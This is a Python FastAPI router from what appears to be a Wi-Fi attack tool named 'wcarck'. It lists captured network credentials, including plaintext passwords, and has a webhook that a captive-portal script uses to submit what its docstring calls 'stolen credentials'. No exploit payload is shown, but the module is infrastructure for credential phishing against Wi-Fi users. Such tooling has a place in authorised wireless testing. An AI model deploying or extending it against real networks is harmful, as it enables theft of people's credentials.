from fastapi import APIRouter, Depends
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from typing import List, Optional
from pydantic import BaseModel
from wcarck.db.session import get_db
from wcarck.db.models import Credential
from datetime import datetime

router = APIRouter(prefix="/api/credentials", tags=["credentials"])

class CredentialRes(BaseModel):
    id: int
    network_ssid: str
    password: str
    client_mac: Optional[str]
    captured_at: datetime
    validated: bool
    
    class Config:
        from_attributes = True

@router.get("", response_model=List[CredentialRes])
async def list_credentials(db: AsyncSession = Depends(get_db)):
    from wcarck.api.projects import get_active_project
    active_project = await get_active_project(db)
    
    stmt = select(Credential)
    if active_project:
        stmt = stmt.where(Credential.project_id == active_project.id)
        
    stmt = stmt.order_by(Credential.captured_at.desc())
    result = await db.execute(stmt)
    return list(result.scalars().all())

class CaptiveCredentialReq(BaseModel):
    job_id: str
    type: str
    username: str
    plainText: str
    client_mac: str
    valid: bool

@router.post("/captured")
async def capture_credential(req: CaptiveCredentialReq):
    """Webhook for captive_portal.py to submit stolen credentials"""
    from wcarck.core.event_bus import bus
    import time
    
    # Publish to event bus, which will handle SQLite insertion and UI WebSocket broadcast
    bus.publish("credential.captured", {
        "job_id": req.job_id,
        "type": req.type,
        "username": req.username,
        "plainText": req.plainText,
        "clientMac": req.client_mac,
        "valid": req.valid,
        "timestamp": time.time()
    })
    
    return {"status": "success"}
